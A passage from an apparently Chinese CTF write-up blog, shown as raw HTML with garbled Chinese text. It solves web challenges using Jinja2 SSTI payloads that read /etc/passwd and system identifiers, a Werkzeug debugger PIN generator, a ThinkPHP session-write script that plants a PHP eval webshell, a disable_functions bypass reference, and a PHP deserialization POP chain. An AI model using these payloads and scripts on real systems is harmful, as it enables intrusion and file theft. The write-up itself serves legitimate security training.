markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç¯å¢ƒæ˜¯Python2ï¼Œpayloadå¯ä»¥æ„é€ ä¸ºï¼š</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿå‰é¢çš„æ“ä½œä¸€æ ·ï¼Œå…ˆç¼–ç ï¼Œå†å»è§£ç å¼•å‘SSTIï¼Œå›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu13.png" alt=""><br>æˆ‘ä»¬çœ‹åˆ°å¯ä»¥ç”¨æˆ·å<code>flaskweb</code>ï¼Œåº”è¯¥å°±æ˜¯å®ƒäº†ã€‚</p><p><code>modename</code>ä»¥åŠç¬¬ä¸‰ä¸ªã€ç¬¬å››ä¸ªå·²ç»çŸ¥é“äº†ï¼Œç›´æ¥å»æ‰¾<code>str(uuid.getnode())</code>çš„å€¼ã€‚</p><h4 id="è·å–str-uuid-getnode"><a href="#è·å–str-uuid-getnode" class="headerlink" title="è·å–str(uuid.getnode())"></a>è·å–str(uuid.getnode())</h4><p>æ„é€ payloadï¼š</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/sys/class/net/eth0/address'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§åŒæ ·çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ï¼Œå¾—åˆ°å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu14.png" alt=""><br>ç„¶ååˆ°<a href="https://tool.oschina.net/hexconvert/">è¿›åˆ¶è½¬æ¢ç½‘ç«™</a>è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚</p><h4 id="è·å–æœºå™¨ç "><a href="#è·å–æœºå™¨ç " class="headerlink" title="è·å–æœºå™¨ç "></a>è·å–æœºå™¨ç </h4><p>æ„é€ payloadï¼š</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">1</span>].<span class="strong">__subclasses__</span>()[<span class="string">103</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/proc/self/cgroup'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu15.png" alt=""><br>ç¬¬ä¸€é¡¹<code>/docker/</code>åé¢çš„å­—ç¬¦ä¸²å³ä¸ºæˆ‘ä»¬è¦æ‰¾çš„æœºå™¨ç ã€‚<br>è‡³æ­¤ï¼Œæ‹¿åˆ°äº†ç”Ÿæˆ<code>PIN</code>çš„æ‰€æœ‰çš„è¦ç´ äº†ï¼Œåˆ©ç”¨ä¸‹é¢çš„è„šæœ¬ç”Ÿæˆ<code>PIN</code>ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485377957890'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ°é¢˜ç›®çš„é“¾æ¥åé¢åŠ ä¸Š<code>/console</code>è¿›å…¥æ§åˆ¶é¢æ¿ï¼Œè¾“å…¥PINï¼Œè·å–æƒé™ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu16.png" alt=""><br>ç„¶åå°±å¯ä»¥éšæ„è¾“å…¥è¯»å–æ–‡ä»¶æ‹¿flagäº†(æ³¨æ„åˆ—ä¸¾æ–‡ä»¶çš„æ—¶å€™ä¹Ÿå¯ä»¥ç›´æ¥åˆ—ä¸¾æ ¹ç›®å½•çš„<code>ls /</code>)ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu17.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu18.png" alt=""></p><h2 id="Web-easy-thinking"><a href="#Web-easy-thinking" class="headerlink" title="Web-easy_thinking"></a>Web-easy_thinking</h2><p>è€ƒå¯Ÿ<code>ThinkPHP6.0</code>å­˜åœ¨çš„é€šè¿‡<code>SESSION</code>å†™æ–‡ä»¶çš„æ¼æ´ï¼ŒåŒæ—¶ä¹Ÿè€ƒå¯Ÿäº†å¯¹<code>disable_functions</code>çš„ç»•è¿‡ã€‚<br>è¿™ä¸€é“é¢˜æ¯”èµ›çš„æ—¶å€™çŸ¥é“è€ƒå¯Ÿç‚¹æ˜¯SESSIONæ¼æ´äº†ï¼Œä½†æ˜¯ç”±äºæ—¶é—´åŸå› å½“æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œåæ¥ç»smityå¸ˆå‚…æç¤ºï¼Œç»“åˆgetflyå¸ˆå‚…çš„é¢˜è§£ï¼Œå¯¹è¿™é“é¢˜åŠ æ·±äº†ç†è§£å’Œå­¦ä¹ ã€‚åœ¨BUUä¸Šå¤ç°äº†ä¸€ä¸‹ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç”±äºç¯å¢ƒæ˜¯<code>ThinkPHP6.0</code>ï¼Œç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ç›¸å…³çš„æ¼æ´æ–‡ç« ï¼š<br><a href="https://blog.csdn.net/god_zzZ/article/details/104275241">https://blog.csdn.net/god_zzZ/article/details/104275241</a><br><a href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a><br>å°±æ˜¯é€šè¿‡åˆ©ç”¨<code>SESSION</code>å‘æœåŠ¡å™¨å†™å…¥æ–‡ä»¶ï¼Œä»è€Œæ‹¿åˆ°shellã€‚</p><p>æ—¢ç„¶æ˜¯é€šè¿‡SESSIONå†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å­˜åœ¨SESSIONå†™å…¥çš„ä½ç½®ï¼Œåœ¨<code>Member</code>æ§åˆ¶å™¨ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!session(<span class="string">'?UID'</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/home/member/login'</span>);            </span><br><span class="line">&#125;</span><br><span class="line">$data = input(<span class="string">"post."</span>);</span><br><span class="line">$record = session(<span class="string">"Record"</span>);</span><br><span class="line"><span class="keyword">if</span> (!session(<span class="string">"Record"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    session(<span class="string">"Record"</span>,$data[<span class="string">"key"</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨<code>search</code>æ–¹æ³•ä¸­å¯ä»¥è¿›è¡Œä»»æ„SESSIONå†™å…¥ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å°±å¯ä»¥å†™å…¥æ„é€ å¥½çš„å†…å®¹æ¥ç”Ÿæˆshellï¼Œä½†æ˜¯é¦–å…ˆå°±éœ€è¦æ»¡è¶³ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œå³éœ€è¦ä¸€ä¸ªç°æœ‰çš„SESSIONæ–‡ä»¶å¹¶ä¸”åŒ…å«<code>UID</code>å­—æ®µï¼Œä¸‹é¢å°±éœ€è¦æ‰¾åˆ°å°†<code>UID</code>å†™å…¥SESSIONçš„åœ°æ–¹ã€‚<br>åœ¨<code>Member</code>æ§åˆ¶å™¨çš„<code>login</code>æ–¹æ³•ä¸­æ‰¾åˆ°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($userId)&#123;</span><br><span class="line">    session(<span class="string">"UID"</span>,$userId);</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/home/member/index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†<code>UID</code>å†™å…¥SESSIONçš„æ“ä½œæ˜¯åœ¨åˆ¤æ–­ç”¨æˆ·åå’Œå¯†ç æ­£ç¡®ä¹‹åçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªåˆæ³•çš„ç”¨æˆ·è¿›è¡Œç™»å½•ã€‚</p><p>æ‹ä¸€ä¸‹æ•´ä¸ªçš„æ€è·¯ï¼š</p><ul><li>1ã€æ³¨å†Œä¸€ä¸ªåˆæ³•è´¦æˆ·</li><li>2ã€åˆ©ç”¨æ³¨å†Œçš„è´¦æˆ·ç™»å½•æ—¶æ›´æ”¹<code>SESSION</code>å­—æ®µçš„å€¼ä¸º<code>xxx.php</code>ï¼Œå¹¶ä¸”åˆšå¥½æ˜¯32ä¸ªå­—ç¬¦</li><li>3ã€åˆ©ç”¨ç›¸åŒçš„<code>SESSION</code>åœ¨æœç´¢çš„æ—¶å€™å†™å…¥ä¸€å¥è¯</li><li>4ã€åœ¨<code>/runtime/session</code>æ–‡ä»¶å¤¹ä¸‹æµ‹è¯•ä¸€å¥è¯ï¼Œæ³¨æ„æ˜¯<code>sess_</code>å¼€å¤´çš„</li></ul><p>å‚è€ƒgetflyå¸ˆå‚…çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url_reg = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/register'</span></span><br><span class="line">url_log = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/login'</span></span><br><span class="line">url_sea = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/search'</span></span><br><span class="line">headers = &#123; <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=1234567890123456789012345678.php'</span> &#125;</span><br><span class="line">data1 = &#123;<span class="string">'username'</span>:<span class="string">'ggb0n'</span>, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;</span><br><span class="line">data2 = &#123;<span class="string">'key'</span>:<span class="string">'&lt;?php @eval($_POST["x"]);echo "not flag"; ?&gt;'</span>&#125;</span><br><span class="line">s1 = requests.post(url_reg, data1)</span><br><span class="line">s2 = requests.post(url_log, data1, headers=headers)</span><br><span class="line">s3 = requests.post(url_sea, data2, headers=headers)</span><br><span class="line">test = <span class="string">'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php'</span></span><br><span class="line">s = requests.get(test).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'not flag'</span> <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="string">'success'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'failed'</span>)</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥å°é©¬ä¹‹ååœ¨ç»ˆç«¯è¿è¡Œ<code>/readflag</code>æ˜¯æ²¡ç”¨çš„ï¼Œåˆ©ç”¨<code>phpinfo()</code>å‘ç°æ˜¯å› ä¸º<code>disable_functions</code>æŠŠ<code>system</code>ç»™banæ‰äº†ï¼š<br><img src="http://www.ggb0n.cool/images/ichunqiu28.png" alt=""><br>é‚£å°±éœ€è¦ç»•è¿‡é™åˆ¶ï¼Œsmityå¸ˆå‚…æ¯”èµ›çš„æ—¶å€™å°±æé†’éœ€è¦ç”¨<code>php_gc_uaf.php</code>æ¥ç»•è¿‡<code>disable_functhions</code>ï¼Œä¸€äº›ç»•è¿‡æ–¹æ³•å‚è€ƒ<a href="https://blog.csdn.net/jia3643/article/details/104200164">è¿™é‡Œ</a>ã€‚<br>æŠŠ<code>php_gc_uaf.php</code>ä¼ åˆ°ä¸€ä¸ª<code>777</code>æƒé™çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶ååœ¨æµè§ˆå™¨ç«¯è®¿é—®è¯¥æ–‡ä»¶å³å¯æ‹¿åˆ°flagã€‚</p><p>ã€è¡¥å……ã€‘è¿™ä¸ª<a href="https://www.exploit-db.com/exploits/48072">exp</a>ä¸ç”¨777æƒé™çš„æ–‡ä»¶å¤¹å°±èƒ½æ‰§è¡Œï¼Œwebç›®å½•å³å¯ã€‚é«˜æ ¡æˆ˜â€œç–«â€ä¸­çš„PHP-UAFå°±æ˜¯ç”¨çš„è¿™ä¸ªã€‚</p><h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><p>è€ƒå¯Ÿååºåˆ—åŒ–é€ƒé€¸æ¼æ´ï¼Œè¿™ä¸ªä¹‹å‰åœ¨BUUä¸Šåˆ·äº†<a href="http://47.107.152.5/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/#0CTF-2016-piapiapia">ä¸€é“ç±»ä¼¼çš„é¢˜ç›®</a>ï¼Œä¸è¿‡æ›´åŠ å¤æ‚ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œçœ‹äº†WPè®°å½•å­¦ä¹ ä¸€ä¸‹ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ‰«æåå°å¯ä»¥å‘ç°å­˜åœ¨æºç <code>www.zip</code>ï¼Œä¸‹è½½åæ˜¯å››ä¸ªphpæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸»è¦åˆ†æä¸æ‹¿flagç›¸å…³çš„ä»£ç ã€‚<br>é¦–å…ˆä»<code>update.php</code>ä¸­å‘ç°ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œç™»é™†æˆåŠŸä¹‹åå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><p>ç„¶åå®¡è®¡å…³é”®æ–‡ä»¶<code>lib.php</code>ï¼Œåœ¨å…¶ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œï¼Œå°±æƒ³åˆ°äº†ä¹‹å‰åœ¨BUUä¸Šåˆ·çš„<strong>[0CTF 2016]piapiapia</strong>ï¼Œé‚£é“é¢˜è€ƒå¯Ÿçš„å°±æ˜¯ååºåˆ—åŒ–æº¢å‡ºæ¼æ´ï¼Œè¿™ä¹Ÿå°±æ˜¯åˆ†æçš„å…³é”®äº†ã€‚<br>å†å¾€ä¸‹çœ‹ï¼Œåœ¨<code>UpdateHelper</code>ç±»ä¸­æœ‰ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„ç”¨æˆ·å¯æ§çš„åªæœ‰<code>Info</code>ç±»ä¸­çš„ä¸¤ä¸ªå±æ€§<code>age</code>ã€<code>nickname</code>ï¼Œä¸èƒ½å®Œå…¨æ§åˆ¶åºåˆ—åŒ–æ•°æ®ï¼Œæ— æ³•æ³¨å…¥å¯¹è±¡ã€‚<br>è·Ÿè¿›<code>User</code>ç±»ä¸­çš„ååºåˆ—åŒ–ç‚¹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œååºåˆ—åŒ–çš„æ˜¯<code>getNewinfo()</code>æ–¹æ³•è·å–çš„å†…å®¹ï¼Œå†æ¥çœ‹ä¸€ä¸‹<code>getNewinfo()</code>ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹<code>Info</code>ç±»çš„å†…å®¹åºåˆ—åŒ–ä¹‹åï¼Œä¼šå…ˆç»è¿‡å‰é¢æåˆ°çš„<code>safe()</code>å‡½æ•°å¤„ç†ï¼Œç„¶åæ‰è¿›è¡Œååºåˆ—åŒ–ã€‚<br>è¿™é‡Œå°±æ˜¯æ„é€ ååºåˆ—åŒ–é€ƒé€¸çš„åœ°æ–¹ï¼šé€šè¿‡å†™å…¥é»‘åå•ä¸­çš„å­—ç¬¦\å­—ç¬¦ä¸²ï¼Œåœ¨ç»è¿‡<code>safe()</code>å‡½æ•°å¤„ç†çš„æ—¶å€™ä¼šæ›¿æ¢ä¸º<code>hacker</code>ï¼Œä»è€Œæ”¹å˜äº†é•¿åº¦ï¼Œä½†æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæ¯ä¸€ä¸ªå±æ€§çš„å†…å®¹é•¿åº¦éƒ½æ˜¯å›ºå®šçš„ï¼Œä»è€Œå°±å¯ä»¥åˆ©ç”¨æ›¿æ¢å…³ç³»æ„é€ å‡ºé€ƒé€¸ï¼Œç„¶åæ³¨å…¥å¯¹è±¡ã€‚</p><p>æ•´ç†ä¸€ä¸‹æ„é€ popé“¾çš„æ€è·¯ï¼š</p><blockquote><p>åˆ©ç”¨<code>UpdateHelper</code>çš„<code>__destruct</code>è§¦å‘<code>User</code>çš„<code>__toString</code>ç„¶åèµ°åˆ°<code>Info</code>çš„<code>__call</code>æ–¹æ³•ï¼Œåœ¨<code>__call</code>ä¸­è°ƒç”¨äº†<code>dbCtrl</code>ç±»çš„<code>login</code>æ–¹æ³•ï¼Œé€šè¿‡æ§åˆ¶æŸ¥è¯¢è¯­å¥ï¼ŒæŠŠ<code>admin</code>è´¦æˆ·çš„å¯†ç æŸ¥å‡ºæ¥ã€‚</p></blockquote><p>å®˜æ–¹POCå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line">$d = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">'admin'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Info(<span class="string">''</span>,<span class="string">'1'</span>);</span><br><span class="line">$b-&gt;CtrlCase=$d;</span><br><span class="line">$a = <span class="keyword">new</span> user();</span><br><span class="line">$a-&gt;nickname=$b;</span><br><span class="line">$a-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">$c=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$c-&gt;sql=$a;</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹</p><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">7</span>:<span class="string">"newinfo"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"sql"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"User"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">45</span>:<span class="string">"select password,id from user where username=?"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">0</span>:<span class="string">""</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">1</span>:<span class="string">"1"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;<span class="string">O:</span><span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">8</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"hostname"</span>;<span class="string">s:</span><span class="number">9</span>:<span class="string">"127.0.0.1"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbuser"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">6</span>:<span class="string">"dbpass"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"root"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"database"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"test"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;N;<span class="string">s:</span><span class="number">6</span>:<span class="string">"mysqli"</span>;N;<span class="string">s:</span><span class="number">5</span>:<span class="string">"token"</span>;<span class="string">s:</span><span class="number">5</span>:<span 